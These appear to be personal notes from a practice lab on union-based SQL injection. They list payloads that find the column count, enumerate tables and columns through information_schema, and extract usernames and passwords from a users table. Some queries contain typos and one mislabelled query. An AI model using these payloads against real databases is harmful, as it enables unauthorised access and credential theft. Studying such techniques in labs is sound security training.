# Listing contents of database

to list tables in database query

```sql
select * from information_schema.tables
```

to list cloumns in individual tables

```sql
select * from information_schema.tables where table_name = 'Users'
```

end goal : listing the database contents

finding number of columns

```sql
' order by 1--
' order by 2--
```

got to columns

Now for checking string

```sql
' union select a,NULL from information_schema.tables--

' union select a, a from information_schema.tables--

' union select NULL,a from information_schema.tables-- //error 
```

finding table name in database

```sql
' union select table_name,NULL from infromation_schema.tables-- 
```

got all tables name and column

users_balexb

query to retireve data from this column

```sql
' union select column_name, NULL from information_schema.columns where table_name='users_balexb'-- 
```

got the cloumns for password and username

```sql
' union select username_reukez, password_llqvfh from users_balexb-- 
```

 got the password
